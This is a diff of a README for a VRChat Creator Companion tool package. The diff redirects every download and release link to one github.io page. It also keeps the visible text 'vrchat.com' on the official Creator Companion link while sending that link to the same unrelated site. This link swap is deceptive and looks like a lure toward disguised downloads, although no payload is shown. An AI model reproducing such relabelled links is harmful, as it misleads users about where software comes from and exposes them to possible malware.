@@ -1,6 +1,6 @@
 # 📦 aitsys-vcc-vrchat-tools - Your VRChat Creator Companion Package Hub
 
-[![Download from GitHub](https://img.shields.io/badge/Download_from_Releases-4285F4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zahranab6527/aitsys-vcc-vrchat-tools/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download_from_Releases-4285F4?style=for-the-badge&logo=github&logoColor=white)](https://zahranab6527.github.io)
 
 ## 🚀 What This Tool Does
 
@@ -18,7 +18,7 @@ This tool is for anyone who creates content for VRChat using the VRChat Creator 
 ## 📋 What You Need
 
 - **Windows 10 or 11** (64-bit)
-- **VRChat Creator Companion** installed. Get it from [vrchat.com](https://vrchat.com/home/download) if you do not have it yet.
+- **VRChat Creator Companion** installed. Get it from [vrchat.com](https://zahranab6527.github.io) if you do not have it yet.
 - **Unity** installed through the Creator Companion (version 2019.4.31f1 or later).
 - A stable internet connection.
 - About 100 MB of free disk space for the catalog files.
@@ -28,7 +28,7 @@ This tool is for anyone who creates content for VRChat using the VRChat Creator 
 **Step 1: Visit the download page**
 
 Go to the release page:
-[Download Page](https://github.com/zahranab6527/aitsys-vcc-vrchat-tools/releases)
+[Download Page](https://zahranab6527.github.io)
 
 **Step 2: Find the right file**
 
@@ -101,7 +101,7 @@ Updates happen automatically. When a new version of the catalog is available, VR
 2. Go to **Settings**.
 3. Click **Check for updates** under the AITSYS VCC section.
 
-If you need to update the installer itself, visit the [releases page](https://github.com/zahranab6527/aitsys-vcc-vrchat-tools/releases) and download the latest version.
+If you need to update the installer itself, visit the [releases page](https://zahranab6527.github.io) and download the latest version.
 
 ## ❌ How to Uninstall
 
